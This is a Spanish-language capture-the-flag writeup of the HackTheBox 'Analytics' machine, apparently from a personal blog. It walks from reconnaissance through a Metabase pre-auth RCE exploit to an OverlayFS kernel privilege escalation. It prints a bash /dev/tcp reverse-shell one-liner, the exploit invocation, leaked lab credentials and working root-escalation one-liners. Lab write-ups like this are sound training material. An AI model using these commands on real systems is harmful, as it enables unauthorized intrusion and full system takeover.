---
title: "Analytics"
date: 2025-05-29 16:41:23 +0200
categories: writeups HackTheBox
tags: cve rce máquina metabase vuln_kernel linux overlayfs
description: Writeup de la máquina Analytics de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000045.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.233`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.233 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000250.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.233 -oN targeted
```

Observamos que en la captura de **Nmap** no encontramos nada interesante:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000303.png>)
___
## Explotación

Al tener tan pocas opciones sabremos que la intrusión a la máquina irá a través de la página web alojada en puerto **80**. Al realizar un `whatweb` sobre la página web veremos que nos da un error el cual nos está indicando que es incapaz de redireccionar a la página `analytical.htb`.

```bash
whatweb http://10.10.11.105
```

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000455.png>)

Para solucionar este problema tenemos que aplicar **Virtual Hosting** para ello abrimos el `/etc/hosts` y añadimos la siguiente línea: `10.10.11.233  analytical.htb`.

Ahora veremos que al correr de nuevo el comando de `whatweb` sobre la página web no nos dará ningún error, al igual que si accedemos a través del navegador no tendremos ningún problema.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000600.png>)

El aspecto de la página web es el siguiente:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000642.png>)

Antes de realizar fuzzing sobre dicha página web investigaremos un poco la página web y veremos que el botón de **Login** nos redirige a una subdominio de nombre **data**.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000746.png>)

Otra forma válida de descubrir dicho subdominio sería realizando fuzzing de subdominios usando **Wfuzz** tal que así:

```bash
wfuzz -c -u http://analytical.htb -H 'Host: FUZZ.analytical.htb' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10 --hh 154
```

Observamos que da igual forma nos reporta que existe un subdominio de nombre **data**:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102000909.png>)

Al acceder a dicho subdominio veremos que nos da un error similar al que hemos tenido al principio por lo que para solucionarlo debemos actualizar la línea del `/etc/hosts` a `10.10.11.233  analytical.htb data.analytical.htb`.

Al acceder a dicho subdominio vemos que en ella se encuentra alojada un servicio web de nombre **Metabase**.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102001404.png>)

Como ya sabemos el nombre del dominio buscaremos por la versión de dicho servicio y tal y como vemos a continuación encontraremos la versión visualizando el código fuente al buscar por la palabra `version`:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102001508.png>)

Una vez tenemos el nombre (**Metabase**) y la versión (**0.46.6**) del servicio web buscaremos en **searchsploit** por exploits y veremos que existe uno:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102001736.png>)

No estaremos usando este exploit ya que nos otorga directamente una shell muy incómoda por lo que en su lugar nos descargaremos el exploit de este [Repositorio | Metabase-pre-auth-rce-proc](https://github.com/m3m0o/metabase-pre-auth-rce-poc), es decir ejecutaremos lo siguiente:

```bash
wget https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/refs/heads/main/main.py
```

Ejecutaremos el panel de ayuda (`python3 exploit_metabase.py --help`) para ver los argumentos que hemos de introducir:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102005510.png>)

Veremos que necesitamos un token el cual debemos obtenerlo accediendo a `/api/session/properties` por lo ejecutaremos el siguiente comando con **curl** para obtener dicho token:

```bash
curl -s http://data.analytical.htb/api/session/properties | jq | grep token
```

Observamos que nos devuelve correctamente el token por lo que nos lo copiaremos el token en la **clipboard**:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102005824.png>)

Una vez que tenemos el **token** ejecutaremos el exploit pasándole como valor al parámetro `-c` el comando el cual ejecuta un **ping** a nuestra **Dirección IP** para así poder comprobar si tenemos ejecución remota de comandos (**RCE**) ya que no podemos ver el output de los comandos ejecutados.

```bash
python3 exploit_metabase.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'ping -c 1 10.10.14.10'
```

Poniéndonos previamente en escucha con `tcpdump -i tun0 icmp -n` veremos que recibimos el paquete ping perteneciente a la **Dirección IP** de la máquina víctima.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102005958.png>)

Nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y pasaremos como valor al parámetro `-c` el siguiente oneliner `bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"` el cual nos enviará una **Reverse Shell**, tal y como podemos ver a continuación:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102010740.png>)
___
## Escalada de privilegios

Una vez hemos recibido la **Reverse Shell** nos daremos que no podemos realizar un **Tratamiento de la TTY** ya que no existe el binario `/usr/bin/script` ni tampoco esta python instalado por que tendremos que tirar con la shell asquerosa que tenemos.

En primer lugar, nos daremos cuenta que estamos en un contenedor debido nuestro extraño **hostname** y **Dirección IP**, tal y como vemos a continuación:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102011812.png>)

Debemos de escapar del contenedor (**Docker Breakout**), por lo que seguiremos realizaremos las comprobaciones típicas para escapar del contenedor y nos daremos cuenta que al mirar las variables de entorno (`env`) nos encontramos con un **Information Leakage**.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102011447.png>)

Como bien recordamos el puerto **22** (**ssh**) de la máquina víctima estaba abierto por lo que probaremos a autenticarnos con las credenciales encontradas (**metalytics:An4lytics_ds20223#**) gracias al siguiente comando:

```bash
ssh metalytics@10.10.11.233
```

Nos conectaremos correctamente por lo que ahora sí que habremos ganado acceso a la máquina víctima además cambiaremos nuestra variable de entorno **TERM** (`export TERM=xterm`) para poder limpiar la pantalla, es decir un <kbd>CTRL</kbd>+<kbd>L</kbd>.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102012455.png>)

Una vez dentro de la máquina miraremos buscaremos las principales formas de escalar nuestros privilegios (**Sudoers**, **SUID**) y tras un rato mirando nos daremos cuenta que nuestra versión del kernel (`uname -a`) es la siguiente:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102013047.png>)

Si buscamos en internet por exploits relacionados con esta versión del **kernel** veremos que existe una **vulnerabilidad** relacionada con **OverlayFS**, una herramienta que viene instalada con el sistema la cual nos permite establecer archivos como puntos de montaje:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102013123.png>)

Básicamente la **Explotación en el Kernel** se puede resumir en un oneliner como el que vemos a continuación:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

Observamos que hemos conseguido ejecutar comandos como el usuario **root**:

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102012916.png>)

En este punto lo que haremos será ejecutarnos una **/bin/bash**, en definitiva sería ejecutar el siguiente one liner:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

Observamos como finalmente nos convertimos en el usuario **root** gracias a una **Explotación en el Kernel**.

![](<../assets/images/posts/2025-05-29-analytics/Pasted image 20250102012952.png>)